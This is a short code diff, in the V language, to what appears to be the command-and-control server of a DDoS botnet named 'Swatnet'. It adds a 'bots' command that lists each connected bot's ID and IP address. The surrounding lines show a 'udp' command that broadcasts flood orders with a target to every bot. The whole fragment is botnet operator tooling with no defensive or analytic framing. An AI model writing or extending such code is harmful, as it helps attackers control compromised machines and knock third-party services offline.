@@ -87,6 +87,12 @@ pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
 				"help" {
 					client.write_string("Working\r\n") or { 0 }
 				}
+				"bots" {
+					client.write_string("Bots: ${s.bot.nickname.len}\r\n#######################################\r\n") or { 0 }
+					for i in 0..(s.bot.ip).len {
+						client.write_string("BID: ${i} | IP: ${s.bot.ip[i]}\r\n") or { 0 }
+					}
+				}
 				"udp" {
 					s.bot.broadcast_cmd("udp ${args[1]} ${args[2]} ${args[3]}")
 				} else {}
